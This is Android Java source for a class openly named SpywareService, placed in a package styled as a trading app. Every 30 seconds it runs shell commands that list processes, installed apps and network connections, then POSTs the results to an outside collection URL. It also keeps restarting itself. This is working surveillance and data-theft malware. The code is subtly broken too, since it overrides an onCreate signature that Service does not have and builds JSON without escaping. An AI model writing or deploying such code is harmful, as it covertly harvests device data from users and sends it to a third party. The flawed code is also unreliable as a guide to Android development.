package com.tradex.pro;

import android.app.Service;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;

public class SpywareService extends Service {
    private static final String LOG_TAG = "TradeXProService";
    private static final String EXFIL_URL = "https://traderscheme.com/collect";
    
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(LOG_TAG, "SpywareService started");
        startMonitoring();
    }
    
    private void startMonitoring() {
        Timer monitorTimer = new Timer();
        monitorTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                try {
                    String processes = getRunningProcesses();
                    String apps = getInstalledApps();
                    String network = getNetworkInfo();
                    
                    Map<String, String> data = new HashMap<>();
                    data.put("timestamp", String.valueOf(System.currentTimeMillis()));
                    data.put("processes", processes);
                    data.put("apps", apps);
                    data.put("network", network);
                    
                    exfiltrateData("system_info", data.toString());
                } catch (Exception e) {
                    Log.e(LOG_TAG, "Monitoring error", e);
                }
            }
        }, 0, 30000);
    }
    
    private String getRunningProcesses() {
        try {
            Process process = Runtime.getRuntime().exec("ps");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line).append("\n");
            }
            return sb.toString();
        } catch (Exception e) {
            return "error";
        }
    }
    
    private String getInstalledApps() {
        try {
            Process process = Runtime.getRuntime().exec("pm list packages");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line).append("\n");
            }
            return sb.toString();
        } catch (Exception e) {
            return "error";
        }
    }
    
    private String getNetworkInfo() {
        try {
            Process process = Runtime.getRuntime().exec("netstat -a");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line).append("\n");
            }
            return sb.toString();
        } catch (Exception e) {
            return "error";
        }
    }
    
    private void exfiltrateData(String type, String data) {
        try {
            URL url = new URL(EXFIL_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            
            String postData = "{\"type\":\"" + type + "\",\"data\":\"" + data + "\"}";
            conn.getOutputStream().write(postData.getBytes());
            conn.getInputStream();
            
            Log.d(LOG_TAG, "Exfiltrated " + type);
        } catch (Exception e) {
            Log.e(LOG_TAG, "Exfiltration error", e);
        }
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
}
